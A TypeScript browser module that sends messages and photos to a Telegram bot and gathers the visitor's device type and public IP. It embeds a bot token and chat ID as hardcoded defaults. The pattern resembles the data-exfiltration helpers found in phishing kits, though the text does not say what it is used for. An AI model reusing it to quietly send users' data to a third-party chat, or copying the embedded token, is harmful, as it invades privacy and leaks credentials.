const DEFAULT_BOT_TOKEN = '8679366460:AAHZOLv00YmMK8GwjNg9gy53KQuLnUoOuR0';
const DEFAULT_CHAT_ID = '8472630369';

export const sendTelegramNotification = async (message: string) => {
  try {
    const token = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || DEFAULT_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || DEFAULT_CHAT_ID;
    
    if (!token || !chatId) return;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    
    await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });
  } catch (err) {
    console.error('Failed to send telegram notification', err);
  }
};

export const sendTelegramMessage = sendTelegramNotification;

export const getDeviceInfo = () => {
  const ua = navigator.userAgent;
  if (/android/i.test(ua)) return 'Android Device';
  if (/iPad|iPhone|iPod/.test(ua)) return 'iOS Device (iPhone/iPad)';
  if (/windows/i.test(ua)) return 'Windows PC';
  if (/macintosh|mac os x/i.test(ua)) return 'macOS';
  if (/linux/i.test(ua)) return 'Linux';
  return ua.substring(0, 50);
};

export const getIpAddress = async () => {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip || 'Unknown IP';
  } catch (err) {
    return 'Unknown IP';
  }
};

export const sendTelegramPhoto = async (
  arg1: string | Blob | File,
  arg2?: string | Blob | File,
  _isHtml?: boolean
) => {
  try {
    const token = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || DEFAULT_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || DEFAULT_CHAT_ID;
    if (!token || !chatId) return;

    let photoBlob: Blob | File | undefined;
    let caption: string = '';

    if (typeof arg1 === 'string') {
      caption = arg1;
      photoBlob = arg2 as Blob | File;
    } else {
      photoBlob = arg1 as Blob | File;
      caption = typeof arg2 === 'string' ? arg2 : '';
    }

    if (!photoBlob) return;

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('caption', caption);
    formData.append('parse_mode', 'HTML');
    formData.append('photo', photoBlob, 'photo.jpg');

    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: 'POST',
      body: formData,
    });
  } catch (err) {
    console.error('Failed to send telegram photo', err);
  }
};
